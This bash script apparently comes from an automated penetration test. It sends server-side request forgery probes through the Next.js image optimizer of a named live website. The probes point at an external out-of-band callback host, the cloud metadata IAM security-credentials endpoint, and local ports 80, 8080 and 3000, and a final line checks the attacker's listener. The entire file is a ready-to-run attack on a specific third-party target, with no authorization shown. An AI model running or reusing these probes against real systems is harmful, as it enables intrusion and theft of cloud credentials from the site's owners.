#!/bin/bash
# SSRF probes against the now-reachable Next.js image optimizer.
W="$WORK_PATH/tool_outputs/sqlmap"
mkdir -p "$W"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
B="https://www.infinitycapital.bh"
H="oobe6bd84ac6e22.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

probe() {
  label="$1"; url="$2"
  code=$(curl -s -m 20 -o "$W/ssrf_$label.out" -w '%{http_code} %{size_download}' -A "$UA" \
    "$B/_next/image?url=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$url")&w=1080&q=75")
  echo "[$label] $code  <- $url" | tee -a "$W/ssrf.txt"
}

probe cb1 "http://$H/ssrf-imgopt"
probe cb2 "http://$H/imgopt?x=1"
probe meta "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
probe local "http://127.0.0.1:80/"
probe local8080 "http://127.0.0.1:8080/"
probe local3000 "http://127.0.0.1:3000/"

echo "--- control: direct curl to our own callback host (proves listener is alive)"
curl -s -m 8 -o /dev/null -w "control code=%{http_code}\n" "http://$H/control-self"
